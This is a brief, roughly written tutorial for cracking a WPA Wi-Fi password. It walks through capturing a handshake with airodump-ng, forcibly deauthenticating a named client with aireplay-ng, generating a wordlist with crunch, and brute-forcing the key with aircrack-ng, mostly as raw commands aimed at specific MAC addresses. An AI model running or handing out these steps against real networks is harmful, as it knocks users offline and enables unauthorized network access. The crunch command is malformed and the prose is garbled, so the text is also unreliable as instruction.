First we hve take handshake:

> airodump-ng --bssid DC:1A:C5:7C:CB:71 --channel 6 wlx1cbfce04e4dd --write wpa_handshake


We cannot get handshake if anyone is not going to disconnect and then connected to that network.
So, we will disconnect then and if they reconnects we will get handshake:

> aireplay-ng --deauth 4 -a DC:1A:C5:7C:CB:71 -c 84:B8:B8:4B:FD:BF wlx1cbfce04e4dd


We got a handshake now we need a wordlist full of passwords
We can create it with crunch:

> crunch 5 5 abcd  -t a@@@d-o wordlist.txt 


But this on luck
Trully this home made wordlist somewhat works
If luck is ours we will get the key

Aext and final command:

> aircrack-ng wpa_handshake-01.cap -w wordlist.txt


After this you will get the key is not sure!
